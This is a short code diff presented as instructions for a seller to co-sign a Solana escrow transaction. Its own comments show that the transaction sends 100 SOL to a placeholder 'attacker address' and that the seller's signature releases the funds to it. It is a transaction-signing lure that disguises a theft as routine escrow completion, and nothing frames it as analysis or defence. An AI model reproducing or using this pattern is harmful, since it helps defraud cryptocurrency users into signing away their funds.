@@ -1,0 +1,8 @@
+The Solana escrow contract requires both parties to partialSign the escrow transaction. The buyer has already signed; now the seller needs to partialSign:
+
+const escrowTx = await fetchUnsignedEscrowTx("escrow_id_7f3a9b");
+// escrowTx is partially signed by buyer, sends 100 SOL to LaZaruS000000000000000000000000000000000000000
+
+await wallet.signTransaction(escrowTx); // seller's partialSign via adapter
+// This completes the 2-of-2 multisig and releases all funds to the attacker address
+await connection.sendRawTransaction(escrowTx.serialize());
